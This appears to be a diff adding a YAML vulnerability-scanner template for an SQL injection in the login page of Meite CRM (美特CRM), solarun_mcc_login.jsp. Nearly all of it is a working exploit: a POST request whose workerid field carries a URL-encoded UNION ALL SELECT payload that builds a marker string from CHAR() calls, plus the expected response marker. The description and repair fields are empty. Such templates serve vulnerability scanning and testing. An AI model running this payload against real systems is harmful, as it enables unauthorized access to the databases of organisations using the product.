@@ -1,0 +1,26 @@
+id:
+
+info:
+  name: 美特CRM solarun_mcc_login.jsp SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /si/callcenter/solarun/mcc_login.jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br, zstd
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Connection: keep-alive
+  data: |
+    workerid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28103%29%2BCHAR%28100%29%2BCHAR%2875%29%2BCHAR%28105%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2890%29%2BCHAR%2873%29%2BCHAR%28105%29%2BCHAR%2873%29%2BCHAR%28104%29%2BCHAR%28104%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%2887%29%2BCHAR%2883%29%2BCHAR%28121%29%2BCHAR%28114%29%2BCHAR%28106%29%2BCHAR%2881%29%2BCHAR%2866%29%2BCHAR%2890%29%2BCHAR%2865%29%2BCHAR%28103%29%2BCHAR%28106%29%2BCHAR%2884%29%2BCHAR%28119%29%2BCHAR%2880%29%2BCHAR%2871%29%2BCHAR%28117%29%2BCHAR%2871%29%2BCHAR%2865%29%2BCHAR%2879%29%2BCHAR%28106%29%2BCHAR%2880%29%2BCHAR%2866%29%2BCHAR%2898%29%2BCHAR%2868%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29--+ewaD&passwd=ab123def&rtype=call400
+response1:
+  body: qjzvq
+  code: 200
+requests2:
+response2:
